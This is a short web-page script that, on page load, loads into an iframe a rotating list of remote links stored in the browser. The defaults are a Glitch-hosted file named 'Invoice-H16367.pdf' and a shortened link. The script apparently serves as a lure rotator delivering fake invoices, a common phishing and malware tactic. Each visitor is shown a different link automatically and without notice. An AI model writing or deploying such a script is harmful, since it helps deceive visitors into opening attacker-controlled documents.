const defaultUrls = [
  "https://cdn.glitch.global/49ef04c4-9556-4b36-a058-d476af6cd888/Invoice-H16367.pdf?v=1728781787797",
  "https://cdn.glitch.global/49ef04c4-9556-4b36-a058-d476af6cd888/Invoice-H16367.pdf?v=1728781787797",
  "https://kutt.itarian.com/VyWj9B"
];

let urls = JSON.parse(localStorage.getItem("urls")) || [...defaultUrls];

let currentIndex = localStorage.getItem("currentIndex");
if (currentIndex === null || currentIndex >= urls.length) {
  currentIndex = 0;
} else {
  currentIndex = parseInt(currentIndex, 10);
}

function loadNextURL() {
  if (urls.length === 0) {
    urls = [...defaultUrls];
    alert("No more URLs available. Reinstalling the default URLs.");
    localStorage.setItem("urls", JSON.stringify(urls));
    currentIndex = 0;
  }

  const iframe = document.getElementById("content-frame");
  const loader = document.getElementById("loader");

  loader.style.display = "flex";

  iframe.src = urls[currentIndex];

  iframe.style.display = "none";

  iframe.onload = function () {
    loader.style.display = "none";
    iframe.style.display = "block";
  };

  urls.splice(currentIndex, 1);

  localStorage.setItem("urls", JSON.stringify(urls));

  currentIndex = currentIndex % urls.length;
  localStorage.setItem("currentIndex", currentIndex);
}

document.addEventListener("DOMContentLoaded", () => {
  loadNextURL();
});
